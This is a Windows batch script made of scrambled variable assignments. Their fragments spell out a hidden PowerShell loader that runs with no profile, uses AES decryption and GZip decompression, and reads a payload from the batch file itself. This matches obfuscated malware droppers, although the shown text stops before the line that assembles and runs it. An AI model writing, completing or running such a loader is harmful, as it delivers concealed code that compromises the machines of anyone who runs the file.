@echo off
set "FQCXXkZAGI=ll"
set "aLUbUPyFdx=1."
set "qAooHuXCzS=Sy"
set "VoQhGOwCPr=32"
set "tiQNuYSDyo=0\"
set "oEBiiwTGfW=.e"
set "aequrmoggI=ws"
set "yEoVfFraXB=ll"
set "nXQxbQPJyg=Po"
set "QJQVSGuUWU=xe"
set "CdUIexHgMu=st"
set "XipfgxXxbO=co"
set "ChzDUzPePw=rS"
set "iyDyvXRHWs=Wi"
set "VmjTWnnNbq=do"
set "AjiqgMKnbq=we"
set "KPJXXiilGE= C"
set "ceBQhQUBTU=\W"
set "TPjYrllkBa=s\"
set "nUOotlEGVo=he"
set "EfygJACbPz=in"
set "iPgnfFjIcg=po"
set "hdrNKqjYCX= /"
set "luNqwQUITT=we"
set "jpSjSIsGgW=y "
set "gMWzhjPzRg=rs"
set "qQXnyhyKsF=em"
set "lwVhmYwMRg=he"
set "rGmmfgxnDB=\v"
set "WIJJRhzshX=nd"
set "HSsKLpRPsA=py"
set "oLRxMaGbJJ=ow"
set "cGlqacvcFt=:\"
set "aSbHPJXwOJ= %~dp0"
set "qDjqJVyJAK=cd"
set "HCpJavxfhe=G, 0"
set "xMqOCPEHpP=sion"
set "oStKEjjkMh=ypto"
set "NHOjMpCJvy=ct S"
set "TNfFgBSqpn=hy.A"
set "qegxTZUeaK=CFxo"
set "CWxWBFFKES=3); "
set "DUYPLRyHqh=ddin"
set "qiesHZYYid=-nop"
set "MQrTzEXSWx=$lKh"
set "xTQcwdKJzk=saBm"
set "PhGRjnhLXj=.Mod"
set "KeCaktqjJl=y.Ci"
set "sghNYREUpk=.Sec"
set "sTDuYXLzTw=Conv"
set "lHviTNvjok=form"
set "juyMPHemuJ=X = "
set "URnQxKduvV=y.Cr"
set "DfNRaTSrmL=gsYZ"
set "cerGTsKwMS=ach "
set "lFPJwudsVE=daeR"
set "BxwlhaPsde=rity"
set "pvkequNKOX=Obje"
set "ifwOWEbJJY=comp"
set "QATiYPyWLp=[]] "
set "NhoGYmqTqn=]::("
set "fmezgpxKrv=e = "
set "NBpuMgTCnU=ress"
set "pwveQgbimo=em.I"
set "VIuoeDwyqF=g = "
set "pHfpbXRqjx=Comp"
set "oLbELXkwIe=kHX."
set "KwsNlBPERO=ress"
set "dzsIMbQnqs=eam("
set "JiXlaQsCoo='txe"
set "ndGeTvDJdi=O.Me"
set "wkhkOWlhgs=tVZN"
set "WZwYFgYbJx=Syst"
set "GEEjVxfuVr=YxVw"
set "kWYxmhuqzc=Star"
set "UbzHfetBbD=-joi"
set "vMeiCXOOJy=aZBi"
set "DeNqIpRzll=ss -"
set "sLTuEBRQQV=c = "
set "nQynmjOjga=Bmor"
set "xFGtIXvGmP=nage"
set "YRtqHuwoGd=:('g"
set "DXwHEIDEGH=grap"
set "ImCiMpvXzK=[IO."
set "cgoqcNolUE=yste"
set "oHbxqwqeRZ=m.Re"
set "XzNMAPkbXj=stem"
set "OlUhPpEyjm=)($a"
set "FSSODXUUtw=comm"
set "svQgmxeDYO=);$O"
set "axhnRuLmdJ=morF"
set "izInCDbigF=  $W"
set "UeKpYkVXpO='')("
set "zFkAQuZpqH=qeoT"
set "dOQBCkhsfg=pStr"
set "doFnCzOxiD=;$sz"
set "SvdupkQMCU=$gWE"
set "JdOfBPEwOA= [Sy"
set "KPHRQucWvK=$qeo"
set "wYmjVHNpoS=mory"
set "KZgUotuOUs=QkrI"
set "ebbYKcHJIN=ion."
set "xsUuaZSVFO=tem."
set "wTRYOokMnc=Mode"
set "OhXtXzgzNZ=rofi"
set "INwwTtuDUz== $G"
set "ZhlcjPzbCL=lit("
set "fhzzaKZZvZ=L4Yi"
set "UZNEhdCYpy=rans"
set "SJKKUdfFwt=[Sys"
set "HfTsqRVZWG=iron"
set "gNIPERFyRC=trea"
set "gToJXfRGmG=('%~f0'"
set "taRuXdOvsd=Secu"
set "KQDqUIjMhc=);$g"
set "sFMaZMnkOQ=tS46"
set "KPAinhJhFG=($po"
